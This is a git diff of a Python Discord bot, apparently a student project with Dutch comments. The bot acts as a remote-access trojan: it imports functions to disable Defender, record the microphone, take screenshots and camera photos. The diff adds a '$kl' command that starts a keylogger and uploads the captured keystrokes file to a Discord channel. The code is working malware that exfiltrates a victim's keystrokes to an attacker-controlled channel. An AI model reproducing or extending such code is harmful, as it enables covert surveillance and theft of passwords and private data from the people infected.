@@ -5,6 +5,7 @@ from week_1.disable_defender import show_running_processes, disable_defender
 from week_3.mic.record_mic import record_mic, list_audio_devices
 from week_3.screenshot.take_screenshot import take_screenshot
 from week_3.camerav2 import maak_foto
+from week_5.keylogger import start_logger
 # laden van env variables1
 DISCORD_BOT_ID = dotenv.get_key("week_2/.env", "DISCORD_BOT_ID")
 DISCORD_SERVER_NAME = dotenv.get_key("week_2/.env", "DISCORD_SERVER_NAME")
@@ -58,10 +59,17 @@ def start_bot():
                 await message.channel.send(str_devices)
             else:
                 await message.channel.send(f"Er ging iets mis tijdens het ophalen van de apparaten: {result}")
+
         elif message.content.startswith("$mf"):
             result = maak_foto("./", "foto")
             time.sleep(1)
             await message.channel.send(result, file=discord.File("foto1.jpg"))
+
+        elif message.content.startswith("$kl"):
+            start_logger()
+            time.sleep(15)
+            await message.channel.send("De keylogger heeft het volgende opgenomen: ", file=discord.File("log.txt"))
+
     client.run(DISCORD_BOT_ID)
 
 
